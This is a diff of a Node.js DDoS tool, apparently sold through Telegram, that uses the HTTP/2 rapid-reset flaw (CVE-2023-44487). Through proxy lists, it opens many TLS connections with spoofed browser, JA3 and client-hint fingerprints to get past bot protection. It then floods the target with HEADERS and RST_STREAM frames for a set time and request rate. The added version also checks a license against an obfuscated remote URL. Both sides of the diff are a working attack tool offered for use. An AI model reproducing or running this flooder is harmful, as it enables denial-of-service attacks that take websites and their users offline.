@@ -1,40 +1,52 @@
-// rapidreset — HTTP/2 rapid reset (CVE-2023-44487)
-// Telegram: @fasthttps
-
-const net = require('node:net');
-const tls = require('node:tls');
-const cluster = require('node:cluster');
-const fs = require('node:fs');
-const os = require('node:os');
-const crypto = require('node:crypto');
-const { EventEmitter } = require('node:events');
+// ну митенька точно по вене швырнул ?  // @rapidreset daite 2000$
+const net = require('net');
+const tls = require('tls');
 const HPACK = require('hpack');
+const cluster = require('cluster');
+const fs = require('fs');
+const os = require('os');
+const crypto = require('crypto');
+const https = require('https');
 
-EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+
 process.setMaxListeners(0);
 
-process.on('uncaughtException', (error) => {
-    console.error('[fatal]', error);
+process.on('uncaughtException', function (e) {
+    console.log(e)
 });
-process.on('unhandledRejection', (error) => {
-    console.error('[rejection]', error);
+process.on('unhandledRejection', function (e) {
+    console.log(e)
 });
 
-const VERSION = '2.6';
-const BUILD = '2026.11';
-const EXPIRY_DATE = new Date('2077-10-25');
-const BLOCKED_DOMAINS = ['.gov', '.edu', '.by', '.ua'];
+const uiiu = 'https'
+const phvk = '://raw.';
+const dmps = 'githubuser';
+const ohhv = 'content.com/';
+const xioe = 'mitenkaa/';
+const ssjc = 'license-';
+const zasd = 'for-tornado/';
+const ihoo = 'main/';
+const lias = 'license';
 
-const statusesQ = [];
-let statuses = {};
+const fwtgws = uiiu + phvk + dmps + ohhv + xioe + ssjc + zasd + ihoo + lias;
+
+const statusesQ = []
+let statuses = {}
 let shouldCloseSession = process.argv.includes('--close');
 let useRandPath = process.argv.includes('--randpath');
+let ver = '2.5';
 let cookiesToInclude = '';
+
+const blockedDomain = [".gov", ".edu", ".by", ".ua"];
+const license = "1";
 
 const timestamp = Date.now();
 const timestampString = timestamp.toString().substring(0, 10);
+const currentDate = new Date();
+const targetDate = new Date('2077-10-25');
 
-const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
+const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
 const reqmethod = process.argv[2];
 const target = process.argv[3];
 const time = process.argv[4];
@@ -78,17 +90,12 @@ const debugMode = process.argv.includes('--debug') && forceHttp != 1;
 if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.clear();
     console.error(`
-    rapidreset ${VERSION} · CVE-2023-44487 · build ${BUILD}
-    Telegram: @fasthttps
-
-    Usage:
+    [flooder - nodejs] tornado ${ver} (CVE-2023-44487) // Updated: 14.09.2024 // With love @rapidreset :3
+    Developers to method: dojdikmc - creator the first version // @rapidreset - more improves & options upgrade
+    How to use & example:
       node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxyfile>
       node ${process.argv[1]} GET "https://target.com" 120 16 128 proxy.txt
-
-    Proxy file / --ip accepts:
-      host:port  ·  host:port:user:pass  ·  http://[user:pass@]host:port
-      blank lines, #comments and unsupported schemes are skipped
-
+    
     Options:
       --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
       --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
@@ -112,67 +119,15 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
 let hcookie = '';
 
 const url = new URL(target);
+const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 
-// host:port | host:port:user:pass | http://[user:pass@]host:port
-// Blank lines, #comments and unsupported schemes return null so they get skipped.
-function parseProxyLine(line) {
-    if (typeof line !== 'string') return null;
-
-    let entry = line.trim();
-    if (!entry || entry.startsWith('#')) return null;
-
-    let username, password;
-
-    const scheme = /^([a-z0-9]+):\/\//i.exec(entry);
-    if (scheme) {
-        if (scheme[1].toLowerCase() !== 'http') return null;
-        entry = entry.slice(scheme[0].length).split('/')[0];
-    }
-
-    const at = entry.lastIndexOf('@');
-    if (at !== -1) {
-        const auth = entry.slice(0, at);
-        entry = entry.slice(at + 1);
-        const sep = auth.indexOf(':');
-        if (sep === -1) return null;
-        username = auth.slice(0, sep);
-        password = auth.slice(sep + 1);
-    }
-
-    const parts = entry.split(':');
-    const host = parts[0];
-    const port = /^\d{1,5}$/.test(parts[1] || '') ? Number(parts[1]) : NaN;
-
-    if (!host || !Number.isInteger(port) || port < 1 || port > 65535) return null;
-
-    if (username === undefined && parts.length >= 4) {
-        username = parts[2];
-        password = parts[3];
-    }
-
-    return { host, port, username, password };
-}
-
-const proxy = fs.readFileSync(proxyfile, 'utf8').split(/\r?\n/).map(parseProxyLine).filter(Boolean);
-const customProxy = customIP ? parseProxyLine(customIP) : null;
-
-if (customIP && !customProxy) {
-    console.error(`[#8] Invalid --ip value: ${customIP}`);
+if (currentDate > targetDate) {
+    console.error('[#1] The method is outdated refer to @rapidreset');
     process.exit(1);
 }
 
-if (!customIP && proxy.length === 0) {
-    console.error(`[#9] No usable proxies found in ${proxyfile}`);
-    process.exit(1);
-}
-
-if (new Date() > EXPIRY_DATE) {
-    console.error('[#1] This build is outdated; contact @fasthttps');
-    process.exit(1);
-}
-
-if (BLOCKED_DOMAINS.some((suffix) => url.hostname.endsWith(suffix))) {
-    console.log(`[#2] Blocked target: ${BLOCKED_DOMAINS.join(', ')} is on the blacklist`);
+if (url.hostname.endsWith(blockedDomain)) {
+    console.log(`[#2] This target in blacklisted ${blockedDomain} if this mistake pm @rapidreset`);
     process.exit(1);
 }
 
@@ -270,57 +225,6 @@ function encodeRstStream(streamId, type, flags) {
     return Buffer.concat([frameHeader, statusCode]);
 }
 
-const h2PseudoOrder = [
-    [':method', ':authority', ':scheme', ':path'],
-    [':method', ':scheme', ':authority', ':path'],
-    [':method', ':path', ':authority', ':scheme'],
-    [':method', ':authority', ':path', ':scheme']
-];
-
-const h2HeaderOrder = [
-    ['cache-control', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'upgrade-insecure-requests', 'user-agent', 'accept', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest', 'accept-encoding', 'accept-language', 'priority'],
-    ['user-agent', 'accept', 'cache-control', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'upgrade-insecure-requests', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest', 'accept-encoding', 'accept-language', 'priority'],
-    ['cache-control', 'user-agent', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'accept', 'upgrade-insecure-requests', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest', 'accept-encoding', 'accept-language', 'priority']
-];
-
-const h2SettingsProfile = [
-    { 1: 65536, 2: 0, 3: 1000, 4: 6291456, 6: 262144 },
-    { 1: 65536, 2: 0, 4: 6291456, 6: 262144 },
-    { 1: 8192, 2: 0, 4: 6291456, 6: 262144 },
-    { 1: 65536, 2: 0, 4: 131072, 6: 262144 }
-];
-
-const h2WindowSize = [15663105, 15663105, 15663105, 24117248];
-
-function orderH2Headers(pseudo, fields) {
-    const pseudoOrder = h2PseudoOrder[getRandomInt(0, h2PseudoOrder.length - 1)];
-    const fieldOrder = h2HeaderOrder[getRandomInt(0, h2HeaderOrder.length - 1)];
-    const map = new Map(fields);
-
-    const ordered = [];
-    for (const key of pseudoOrder) {
-        if (key in pseudo) ordered.push([key, pseudo[key]]);
-    }
-    for (const key of fieldOrder) {
-        if (map.has(key)) ordered.push([key, map.get(key)]);
-    }
-    for (const [key, value] of fields) {
-        if (!ordered.some(([k]) => k === key)) ordered.push([key, value]);
-    }
-    return ordered;
-}
-
-function buildH2Settings() {
-    const profile = h2SettingsProfile[getRandomInt(0, h2SettingsProfile.length - 1)];
-    return encodeSettings(Object.entries(profile).map(([id, value]) => [Number(id), value]));
-}
-
-function buildConnectionWindow() {
-    const buf = Buffer.alloc(4);
-    buf.writeUInt32BE(h2WindowSize[getRandomInt(0, h2WindowSize.length - 1)], 0);
-    return encodeFrame(0, 8, buf);
-}
-
 function randstrr(length) {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     let result = "";
@@ -362,15 +266,102 @@ function ememmmmmemmeme(length) {
     return result;
 }
 
+// const httpStatusCodes = {
+//     "200": { "Description": "OK", "Color": "brightGreen" },
+//     "301": { "Description": "Moved Permanently", "Color": "yellow" },
+//     "302": { "Description": "Found", "Color": "yellow" },
+//     "304": { "Description": "Not Modified", "Color": "yellow" },
+//     "400": { "Description": "Bad Request", "Color": "red" },
+//     "401": { "Description": "Unauthorized", "Color": "red" },
+//     "403": { "Description": "Forbidden", "Color": "red" },
+//     "404": { "Description": "Found", "Color": "red" },
+//     "500": { "Description": "Internal Server Error", "Color": "brightRed" },
+//     "502": { "Description": "Bad Gateway", "Color": "brightRed" },
+//     "503": { "Description": "Service Unavailable", "Color": "brightRed" }
+// };
+
+
+
+// function randomstring(length, type) {
+//     var _ = "";
+//     var characters = "";
+//     if (type == "LN") {
+//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+//     }
+//     else if (type == "L") {
+//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+//     }
+//     else if (type == "N") {
+//         characters = "0123456789";
+//     }
+//     else {
+//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+//     }
+
+//     var charactersLength = characters.length;
+
+//     for (var i = 0; i < length; i++) {
+//         _ += characters.charAt(Math.floor(Math.random() * charactersLength));
+//     }
+
+//     return _;
+// }
+
+// function randflood(target) {
+//     if (target.includes("%RAND%")) {
+//         target = target.replace(/%RAND%/g, randomstring(8, "LN"));
+//     }
+//     else if (target.includes("%RANDLN8%")) {
+//         target = target.replace(/%RANDLN8%/g, randomstring(8, "LN"));
+//     }
+//     else if (target.includes("%RANDLN16%")) {
+//         target = target.replace(/%RANDLN16%/g, randomstring(16, "LN"));
+//     }
+//     else if (target.includes("%RANDLN32%")) {
+//         target = target.replace(/%RANDLN32%/g, randomstring(32, "LN"));
+//     }
+//     else if (target.includes("%RANDLN64%")) {
+//         target = target.replace(/%RANDLN64%/g, randomstring(64, "LN"));
+//     }
+//     else if (target.includes("%RANDL%")) {
+//         target = target.replace(/%RANDL%/g, randomstring(8, "L"));
+//     }
+//     else if (target.includes("%RANDL16%")) {
+//         target = target.replace(/%RANDL16%/g, randomstring(16, "L"));
+//     }
+//     else if (target.includes("%RANDL32%")) {
+//         target = target.replace(/%RANDL32%/g, randomstring(32, "L"));
+//     }
+//     else if (target.includes("%RANDL64%")) {
+//         target = target.replace(/%RANDL64%/g, randomstring(64, "L"));
+//     }
+//     else if (target.includes("%RANDN%")) {
+//         target = target.replace(/%RANDN%/g, randomstring(8, "N"));
+//     }
+//     else if (target.includes("%RANDN16%")) {
+//         target = target.replace(/%RANDN16%/g, randomstring(16, "N"));
+//     }
+//     else if (target.includes("%RANDN32%")) {
+//         target = target.replace(/%RANDN32%/g, randomstring(32, "N"));
+//     }
+//     else if (target.includes("%RANDN64%")) {
+//         target = target.replace(/%RANDN64%/g, randomstring(64, "N"));
+//     }
+//     else {
+//         target = target;
+//     }
+//     return target;
+// }
+
 function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
 const ja3Options = {
     version: 771,
-    cipherSuites: [4865, 4866, 4867, 49195, 49199, 49196, 49200, 52393, 52392, 49171, 49172, 156, 157, 47, 53, 10],
-    extensions: [17513, 13, 27, 0, 10, 65281, 43, 65037, 23, 16, 45, 11, 35, 51, 18, 5, 21, 65037, 41],
-    ellipticCurves: [25497, 29, 23, 24, 4588],
+    cipherSuites: [4865, 4866, 4867, 49195, 49199, 49196, 49200, 52393, 52392, 49171, 49172, 156, 157, 47, 53],
+    extensions: [17513, 13, 27, 0, 10, 65281, 43, 65037, 23, 16, 45, 11, 35, 51, 18, 5],
+    ellipticCurves: [25497, 29, 23, 24],
     ellipticCurvePointFormats: [0]
 };
 
@@ -392,11 +383,20 @@ const ja3Hash = crypto.createHash('md5').update(ja3Fingerprint).digest('hex');
 function generateSpoofedFingerprint() {
     const platform = 'Win64';
     const plugins = [
-        { name: 'PDF Viewer', filename: 'internal-pdf-viewer' },
-        { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer' },
-        { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer' },
-        { name: 'Microsoft Edge PDF Viewer', filename: 'internal-pdf-viewer' },
-        { name: 'WebKit built-in PDF', filename: 'internal-pdf-viewer' },
+        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
+        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
+        { name: 'Google Translate', filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb' },
+        { name: 'Zoom Chrome Extension', filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle' },
+        { name: 'uBlock Origin', filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm' },
+        { name: 'AdBlock', filename: 'gighmmpiobklfepjocnamgkkbiglidom' },
+        { name: 'LastPass', filename: 'hdokiejnpimakedhajhdlcegeplioahd' },
+        { name: 'Grammarly for Chrome', filename: 'kbfnbcaeplbcioakkpcpgfkobkghlhen' },
+        { name: 'Microsoft Office', filename: 'dbjbempljhcmhlfpfacalomonjpalpko' },
+        { name: 'Videostream for Google Chromecast', filename: 'cnciopoikihiagdjbjpnocolokfelagl' },
+        { name: 'HTTPS Everywhere', filename: 'gcbommkclmclpchllfjekcdonpmejbdp' },
+        { name: 'Dark Reader', filename: 'eimadpbcbfnmbkopoojfekhnkhdbieeh' },
+        { name: 'Privacy Badger', filename: 'pkehgijcmpdhfbdbbnkijodmdjhbjlgp' },
+        { name: 'The Great Suspender', filename: 'klbibkeccnjlkjkiokjodocebajanakg' },
     ];
 
     const numPlugins = getRandomInt(2, 5);
@@ -413,30 +413,59 @@ function generateSpoofedFingerprint() {
     return sha256Fingerprint;
 }
 
+function checkLicense(license) {
+    const licenseURL = new URL(fwtgws);
+    const request = https.request(licenseURL);
+    request.setTimeout(15 * 1000);
+    request.on('response', response => {
+        var data = '';
+        response.on('data', chunk => data += chunk);
+        response.on('end', function () {
+            if (data.trim() === license) {
+            } else {
+                process.exit(1);
+            }
+        });
+    });
+    request.on('timeout', function () {
+        console.log('[#8] Whoops something went wrong pm @rapidreset');
+        process.exit(1);
+    });
+    request.on('error', error => {
+        console.log('[#9] Whoops something went wrong pm @rapidreset');
+        process.exit(1);
+    });
+    request.end();
+}
 
 const generatedFP = generateSpoofedFingerprint()
 
-// User-Agent default Firefox; --ua tetap menimpa nilai ini.
-function firefoxUserAgent(version) {
-    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`;
-}
+//sykaconst pizdecf = getRandomInt(150,350)
 
 function buildRequest() {
-    const browserVersion = getRandomInt(138, 143);
-    const userAgent = customuavalue || firefoxUserAgent(browserVersion);
+    const browserVersion = getRandomInt(126, 129);
+    var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
     const fwfw = ['Google Chrome', 'Brave'];
     const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
 
-    const brandGrease = ['Not_A Brand', 'Not;A Brand', 'Not)A;Brand'][getRandomInt(0, 2)];
     let brandValue;
-    if (browserVersion >= 138) {
-        brandValue = `"${brandGrease}";v="8", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
+    if (browserVersion === 126) {
+        brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
     }
-    else if (browserVersion >= 135) {
-        brandValue = `"${wfwf}";v="${browserVersion}", "${brandGrease}";v="24", "Chromium";v="${browserVersion}"`;
+    else if (browserVersion === 127) {
+        brandValue = `\"Not)A;Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
     }
-    else {
-        brandValue = `"Chromium";v="${browserVersion}", "${brandGrease}";v="99", "${wfwf}";v="${browserVersion}"`;
+    else if (browserVersion === 128) {
+        brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+    }
+    else if (browserVersion === 129) {
+        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
+    }
+
+    if (customuavalue) {
+        userAgent = customuavalue;
+    } else {
+        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
     }
 
     const isBrave = wfwf === 'Brave';
@@ -488,18 +517,25 @@ function buildRequest() {
     }
 
     const mmm = Buffer.from(`${headers}`, 'binary');
+    //console.log(headers.toString());
     return mmm;
 }
 
 const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
 
 async function go() {
-    const entry = customProxy || proxy[~~(Math.random() * proxy.length)];
+    let proxyHost, proxyPort, username, password;
 
-    if (!entry) return;
+    if (customIP) {
+        [proxyHost, proxyPort] = customIP.split(':');
+    } else {
+        [proxyHost, proxyPort, username, password] = proxy[~~(Math.random() * proxy.length)].split(':');
+    } let tlsSocket;
 
-    const { host: proxyHost, port: proxyPort, username, password } = entry;
-    let tlsSocket;
+    if (!proxyPort || isNaN(proxyPort)) {
+        await go();
+        return;
+    }
 
     const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
         netSocket.once('data', async () => {
@@ -536,15 +572,15 @@ async function go() {
                     'rsa_pkcs1_sha512'
                 ].join(':'),
                 ecdhCurve: 'X25519:P-256:P-384',
-                secureoptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING,
+                secureoptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                 secure: true,
-                minVersion: 'TLSv1.2',
-                maxVersion: 'TLSv1.3',
+                minVersion: 'TLSv1.3', // Устанавливаем минимальную версию TLS 1.3
+                maxVersion: 'TLSv1.3', // Ограничиваем использование только TLS 1.3
                 session: crypto.randomBytes(64),
-                compression: false,
-                rejectUnauthorized: true,
-                honorCipherOrder: false,
-                requestOCSP: true,
+                compression: true,
+                rejectUnauthorized: true, // Включаем проверку сертификатов
+                honorCipherOrder: false, // Следуем установленному порядку шифров
+                requestOCSP: true, // Включаем проверку отзыва сертификатов через OCSP
             }, () => {
                 if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
 
@@ -583,10 +619,18 @@ async function go() {
                 let hpack = new HPACK();
                 hpack.setTableSize(4096);
 
+                const updateWindow = Buffer.alloc(4);
+                updateWindow.writeUInt32BE(15663105, 0);
+
                 const frames = [
                     Buffer.from(PREFACE, 'binary'),
-                    encodeFrame(0, 4, buildH2Settings()),
-                    buildConnectionWindow()
+                    encodeFrame(0, 4, encodeSettings([
+                        [1, 65536],
+                        [2, 0],
+                        [4, 6291456],
+                        [6, 262144]
+                    ])),
+                    encodeFrame(0, 8, updateWindow)
                 ];
 
                 tlsSocket.on("close", () => {
@@ -596,6 +640,8 @@ async function go() {
 
                 tlsSocket.on('data', (eventData) => {
                     data = Buffer.concat([data, eventData]);
+//    const responseString = data.toString(); /// debug34
+//                 console.log('Received Data:\n', responseString);
                     while (data.length >= 9) {
                         const frame = decodeFrame(data);
                         if (frame != null) {
@@ -677,6 +723,7 @@ async function go() {
                 });
 
                 tlsSocket.write(Buffer.concat(frames));
+                // let ratelimit;
                 let currentPathIndex = 0;
 
                 const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
@@ -698,8 +745,8 @@ async function go() {
                     }
 
                     async function sendRequest() {
-                        const browserVersion = getRandomInt(138, 143);
-                        const userAgent = customuavalue || firefoxUserAgent(browserVersion);
+                        const browserVersion = 129;//getRandomInt(129, 129);
+                        let userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                         const fwfw = ['Google Chrome', 'Brave'];
                         const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                         const ref = ["same-site", "same-origin", "cross-site"];
@@ -707,14 +754,19 @@ async function go() {
                         const allah = ["application/x-www-form-urlencoded; charset=UTF-8", "application/x-www-form-urlencoded", "text/html; charset=utf-8", "application/json", "text/plain"];
                         const allah1 = allah[Math.floor(Math.random() * allah.length)];
 
-                        const brandGrease = ['Not_A Brand', 'Not;A Brand', 'Not)A;Brand'][getRandomInt(0, 2)];
                         let brandValue;
-                        if (browserVersion >= 138) {
-                            brandValue = `"${brandGrease}";v="8", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
-                        } else if (browserVersion >= 135) {
-                            brandValue = `"${wfwf}";v="${browserVersion}", "${brandGrease}";v="24", "Chromium";v="${browserVersion}"`;
-                        } else {
-                            brandValue = `"Chromium";v="${browserVersion}", "${brandGrease}";v="99", "${wfwf}";v="${browserVersion}"`;
+                        if (browserVersion === 126) {
+                            brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+                        } else if (browserVersion === 127) {
+                            brandValue = `"Not)A;Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
+                        } else if (browserVersion === 128) {
+                            brandValue = `"Not;A=Brand";v="24", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+                        } else if (browserVersion === 129) {
+                            brandValue = `"${wfwf}";v="${browserVersion}", "Not=A?Brand";v="8", "Chromium";v="${browserVersion}"`;
+                        }
+
+                        if (customuavalue) {
+                            userAgent = customuavalue;
                         }
 
                         const isBrave = wfwf === 'Brave';
@@ -735,13 +787,12 @@ async function go() {
                         const currentPath = paths[currentPathIndex];
                         currentPathIndex = (currentPathIndex + 1) % paths.length;
 
-                        const h2Pseudo = {
+                        const headers = Object.entries({
                             ":method": "GET",
                             ":authority": url.hostname,
                             ":scheme": "https",
                             ":path": query ? handleQuery(query) : (randpath() || currentPath || url.pathname)
-                        };
-                        const headers = orderH2Headers(h2Pseudo, Object.entries({
+                        }).concat(Object.entries({
                             "cache-control": Math.random() < 0.48 ? "no-cache" : "max-age=0",
                             ...(reqmethod === "POST" && { "content-length": "0" }),
                             ...(reqmethod === "POST" && { "content-type": allah1 }),
@@ -790,6 +841,7 @@ async function go() {
 
                         tlsSocket.write(Buffer.concat([encodeFrame(streamId, 1, packedHeaders, 0x1 | 0x4 | 0x20)]));
 
+
                         if (reset && streamId >= 5 && (streamId - 5) % 10 === 0) {
                             tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                         }
@@ -837,86 +889,44 @@ async function go() {
     });
 }
 
-// ── startup banner ───────────────────────────────────────────────────────────
-// The wordmark carries the only gradient in the tool: it marks identity, so the
-// data rows stay quiet and scannable. Labels keep a fixed 11-column gutter so
-// every value starts on the same column, and the old rule line is replaced by
-// whitespace so the block breathes instead of being fenced in.
-const colorEnabled = Boolean(process.stdout.isTTY) && !process.env.NO_COLOR;
 
-// COLORFGBG is "fg;bg"; a light background needs the deeper pair so the gradient
-// still clears WCAG AA instead of washing out. Unset means we assume a dark one.
-function detectedLightBackground() {
-    const bg = Number((process.env.COLORFGBG || '').split(';').pop());
-    return Number.isInteger(bg) && bg >= 7;
-}
-
-const lightBg = detectedLightBackground();
-
-const bannerPalette = lightBg
-    ? { from: '#0f766e', to: '#6d28d9', muted: '#475569' }
-    : { from: '#5eead4', to: '#a78bfa', muted: '#94a3b8' };
-
-const ANSI_RESET = colorEnabled ? '\x1b[0m' : '';
-
-function hexToRgb(hex) {
-    const value = parseInt(hex.slice(1), 16);
-    return [value >> 16 & 0xff, value >> 8 & 0xff, value & 0xff];
-}
-
-function lerpColor(from, to, t) {
-    return from.map((channel, i) => Math.round(channel + (to[i] - channel) * t));
-}
-
-// Labels use an explicit grey rather than the terminal's dim attribute, so the
-// contrast ratio is a known number (8.2:1 on dark, 7.6:1 on light) instead of
-// whatever the user's theme happens to make of "dim".
-function muted(text) {
-    if (!colorEnabled) return text;
-    const [r, g, b] = hexToRgb(bannerPalette.muted);
-    return `\x1b[38;2;${r};${g};${b}m${text}${ANSI_RESET}`;
-}
-
-function gradient(text, fromHex, toHex) {
-    if (!colorEnabled) return text;
-
-    const chars = [...text];
-    const from = hexToRgb(fromHex);
-    const to = hexToRgb(toHex);
-    const width = chars.filter((char) => char !== ' ').length;
-    let step = 0;
-
-    return chars.map((char) => {
-        if (char === ' ') return char;
-        const [r, g, b] = lerpColor(from, to, width > 1 ? step++ / (width - 1) : 0);
-        return `\x1b[38;2;${r};${g};${b}m${char}`;
-    }).join('') + ANSI_RESET;
-}
-
-function bannerRow(name, value) {
-    return `  ${muted(name.padEnd(11))}${value}`;
-}
-
-function runMaster() {
+if (cluster.isMaster) {
     const workers = {};
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
+    console.log(`
 
-    const meta = `· CVE-2023-44487 · build ${BUILD}`;
+             *     ,MMM8&&&.            *
+                  MMMM88&&&&&    .
+                 MMMM88&&&&&&&
+     *           MMM88&&&&&&&&
+                 MMM88&&&&&&&&
+                 'MMM88&&&&&&'
+                   'MMM8&&&'      *
+          |\___/|
+          )     (             .              '
+         =\     /=
+           )===(       *
+          /     \
+          |     |
+         /       \
+         \       /
+  _/\_/\_/\__  _/_/\_/\_/\_/\_/\_/\_/\_/\_/\_
+  |  |  |  |( (  |  |  |  |  |  |  |  |  |  |
+  |  |  |  | ) ) |  |  |  |  |  |  |  |  |  |
+  |  |  |  |(_(  |  |  |  |  |  |  |  |  |  |
+  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
+  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
 
-    console.log([
-        '',
-        `  ${gradient(`rapidreset ${VERSION}`, bannerPalette.from, bannerPalette.to)}  ${muted(meta)}`,
-        `  ${muted('@fasthttps')}`,
-        '',
-        bannerRow('method', reqmethod),
-        bannerRow('target', target),
-        bannerRow('time', `${time}s`),
-        bannerRow('threads', threads),
-        bannerRow('ratelimit', `${ratelimit}/s`),
-        bannerRow('started', new Date().toLocaleString('en-GB')),
-        ''
-    ].join('\n'));
+> Attack Details:   
+> Version: [tornado - ${ver}]
+> ${Date().toLocaleString("us")}
+> Request Method: [${reqmethod}]
+> Target: [${target}]
+> Time: [${time} sec]
+> Threads: [${threads}x core]
+> Ratelimit: [${ratelimit} rq/s]
+`)
 
     function shutdownCluster() {
         const workerIds = Object.keys(cluster.workers);
@@ -972,10 +982,8 @@ function runMaster() {
     }
 
     setTimeout(() => process.exit(1), time * 1000);
-    setTimeout(() => process.exit(1), time * 1000);
-}
-
-function runWorker() {
+    setTimeout(() => exit(), time * 1000);
+} else {
     let conns = 0;
 
     let i = setInterval(() => {
@@ -1000,7 +1008,7 @@ function runWorker() {
     }
 
     setTimeout(() => process.exit(1), time * 1000);
-    setTimeout(() => process.exit(1), time * 1000);
+    setTimeout(() => exit(), time * 1000);
 
     process.on('SIGINT', cleanupAndExit);
     process.on('SIGTERM', cleanupAndExit);
@@ -1010,10 +1018,4 @@ function runWorker() {
         clearInterval(i);
         process.exit();
     }
-}
-
-if (cluster.isMaster) {
-    runMaster();
-} else {
-    runWorker();
 }
